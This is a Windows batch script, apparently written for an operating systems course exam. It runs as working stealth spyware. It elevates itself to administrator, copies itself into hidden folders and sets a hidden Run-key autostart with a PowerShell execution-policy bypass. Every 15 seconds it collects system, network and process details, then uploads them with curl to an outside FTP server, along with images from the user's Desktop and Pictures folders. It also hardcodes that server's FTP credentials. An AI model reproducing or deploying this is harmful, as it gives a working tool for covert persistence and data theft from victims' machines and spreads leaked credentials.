@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ======================================================================
:: --- CONFIGURACION DE NOMBRES Y VARIABLES DE ENTORNO ---
:: ======================================================================
set "GRUPO=GR03"
set "APELLIDO=Rios"
set "NOMBRE_COMPLETO=Rios Maldonado Julio Cesar"
set "MAQUINA=%COMPUTERNAME%"

:: Título exigido con Apellidos y Nombres
title !GRUPO!_!NOMBRE_COMPLETO!_!MAQUINA!

set "NOM_ARCH=!GRUPO!_!APELLIDO!_!MAQUINA!"
set "ARCHIVO_BAT=!NOM_ARCH!.bat"
set "ARCHIVO_TXT=!NOM_ARCH!.txt"

:: ======================================================================
:: --- VERIFICACION DE ADMIN Y AUTO-ELEVACION ---
:: ======================================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: ======================================================================
:: --- REPLICACIÓN Y CREACIÓN DE CARPETAS (MINIMO EXIGIDO) ---
:: ======================================================================
if not exist "C:\parcial" mkdir "C:\parcial" >nul 2>&1
if not exist "%temp%\parcial" mkdir "%temp%\parcial" >nul 2>&1

:: Copiarse a sí mismo en las ubicaciones requeridas
if /i "%~f0" neq "C:\parcial\!ARCHIVO_BAT!" copy /Y "%~f0" "C:\parcial\!ARCHIVO_BAT!" >nul 2>&1
if /i "%~f0" neq "%temp%\parcial\!ARCHIVO_BAT!" copy /Y "%~f0" "%temp%\parcial\!ARCHIVO_BAT!" >nul 2>&1

:: ======================================================================
:: --- REGEDIT: ARRANQUE DESDE LA RUTA TEMPORAL (OCULTO CON POWERSHELL) ---
:: ======================================================================
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "!APELLIDO!" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process '%temp%\parcial\!ARCHIVO_BAT!' -WindowStyle Hidden\"" /f >nul 2>&1

:: ======================================================================
:: --- OCULTAR CARPETAS Y ARCHIVOS EN TODAS SUS UBICACIONES ---
:: ======================================================================
attrib +h +s "C:\parcial" /d /s >nul 2>&1
attrib +h +s "C:\parcial\!ARCHIVO_BAT!" >nul 2>&1
attrib +h +s "%temp%\parcial" /d /s >nul 2>&1
attrib +h +s "%temp%\parcial\!ARCHIVO_BAT!" >nul 2>&1

:: Rutas de trabajo locales
set "TXT_LOCAL_C=C:\parcial\!ARCHIVO_TXT!"
set "TXT_LOCAL_TMP=%temp%\parcial\!ARCHIVO_TXT!"

set "ORIGEN_ESCRITORIO=%USERPROFILE%\Desktop"
set "ORIGEN_IMAGENES=%USERPROFILE%\Pictures"

:: Configuración de URLs FTP exigidas por el profesor
set "ruta=!GRUPO!_!APELLIDO!_!MAQUINA!"
set "FTP_SERVER=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/!ruta!/!ARCHIVO_TXT!"
set "FTP_URL_ESC=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/!ruta!/Escritorio"
set "FTP_URL_IMG=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/!ruta!/Imágenes"

set "FTP_USER=u917850771"
set "FTP_PASS=Unicesar2026+"

for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"

:BUCLE
set "FECHA=!date!"
set "HORA=!time!"

REM == Obtener IP, MAC y Memoria Total ==
set "IP="
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do (if not defined IP set "IP=%%I")
if defined IP set "IP=!IP:~1!"

set "MAC="
for /f "tokens=1" %%M in ('getmac ^| findstr /r "..-..-..-..-..-.."') do (if not defined MAC set "MAC=%%M")

for /f "tokens=2 delims==" %%R in ('wmic computersystem get totalphysicalmemory /value 2^>nul') do (
    set "MEM_BYTES=%%R"
)

REM == Procesos de Mayor Consumo (PowerShell) ==
for /f "tokens=*" %%P in ('powershell -Command "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 1 -ExpandProperty Name"') do set "MAX_RAM=%%P"
for /f "tokens=*" %%C in ('powershell -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 1 -ExpandProperty Name"') do set "MAX_CPU=%%C"

:: ======================================================================
:: --- GENERACION DEL ARCHIVO INFORMATIVO TXT ---
:: ======================================================================
(
echo ============================================================
echo  3.1. Título: información de la máquina !MAQUINA!
echo ============================================================
echo  3.2. Autor: !GRUPO!_!APELLIDO!
echo  3.3. Fecha: !FECHA!
echo  3.4. Hora: !HORA!
echo  3.5. Versión del sistema operativo: !WIN_VER!
echo  3.6. Memoria Física Total: !MEM_BYTES! Bytes
echo  3.7. IP actuales: !IP!
echo  3.8. MAC actuales: !MAC!
echo  3.9. Usuario actual: !USERNAME!
echo  3.10. Nombre de la maquina: !MAQUINA!
echo  3.13. Proceso que más memoria consume: !MAX_RAM!
echo  3.14. Proceso que más procesador consume: !MAX_CPU!
echo ============================================================
echo  3.11. PUERTOS ABIERTOS Y CONEXIONES (netstat)
echo ============================================================
netstat -ano
echo.
echo ============================================================
echo  3.12. LISTAR PROCESOS ACTIVOS (tasklist)
echo ============================================================
tasklist
) > "!TXT_LOCAL_C!"

:: Duplicar el reporte en la carpeta temporal por seguridad
copy /Y "!TXT_LOCAL_C!" "!TXT_LOCAL_TMP!" >nul 2>&1

:: Ocultar los archivos de texto generados
attrib +h +s "!TXT_LOCAL_C!" >nul 2>&1
attrib +h +s "!TXT_LOCAL_TMP!" >nul 2>&1

:: ======================================================================
:: --- ENVÍO DE DATOS MEDIANTE CURL AL SERVIDOR FTP (CADA 15 SEG) ---
:: ======================================================================
:: Subir reporte txt principal
curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!TXT_LOCAL_C!" "!FTP_SERVER!" >nul 2>&1

:: Subir imagen1.jpg desde el Escritorio si existe
if exist "!ORIGEN_ESCRITORIO!\imagen1.jpg" (
    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_ESCRITORIO!\imagen1.jpg" "!FTP_URL_ESC!/imagen1.jpg" >nul 2>&1
)

:: Subir imagen2.jpg desde Mis Imágenes si existe
if exist "!ORIGEN_IMAGENES!\imagen2.jpg" (
    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_IMAGENES!\imagen2.jpg" "!FTP_URL_IMG!/imagen2.jpg" >nul 2>&1
)

:: Temporizador estricto de 15 segundos exigido por el profesor
timeout /t 15 /nobreak >nul
goto BUCLE